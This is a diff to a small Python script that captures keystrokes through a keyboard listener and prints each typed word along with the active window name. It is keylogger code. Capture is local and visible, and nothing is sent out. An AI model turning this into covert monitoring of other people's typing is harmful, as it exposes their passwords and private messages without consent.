@@ -3,14 +3,14 @@ import threading
 import time
 
 typed_chars = []
-lock = threading.Lock() #the python built-in threading.Lock() (mutex) object
-delay = 1  # s
+lock = threading.Lock()
+delay = 1  # seconds
 
 def get_active_window():
     # Placeholder function for platform-specific active window retrieval
     return "Active Window"
 
-def print_typed_chars():
+def print_typed_word():
     while True:
         time.sleep(delay)
         with lock:
@@ -20,20 +20,29 @@ def print_typed_chars():
                 typed_chars.clear()
 
 def on_press(key):
+    global typed_chars
     with lock:
         try:
-            typed_chars.append(key.char)
+            if key.char == " ":
+                active_window = get_active_window()
+                print(f'Typed in {active_window}: {"".join(typed_chars)}')
+                typed_chars = []
+            else:
+                typed_chars.append(key.char)
         except AttributeError:
-            typed_chars.append(f'[{key}]')
+            if key == keyboard.Key.enter:
+                active_window = get_active_window()
+                print(f'Typed in {active_window}: {"".join(typed_chars)}')
+                typed_chars = []
 
 def on_release(key):
     if key == keyboard.Key.esc:
         # Stop listener
         return False
 
-# Start thread
-threading.Thread(target=print_typed_chars, daemon=True).start()
+# Start a thread to print typed words with a delay
+threading.Thread(target=print_typed_word, daemon=True).start()
 
-# Collect events until> released
+# Collect events until released
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
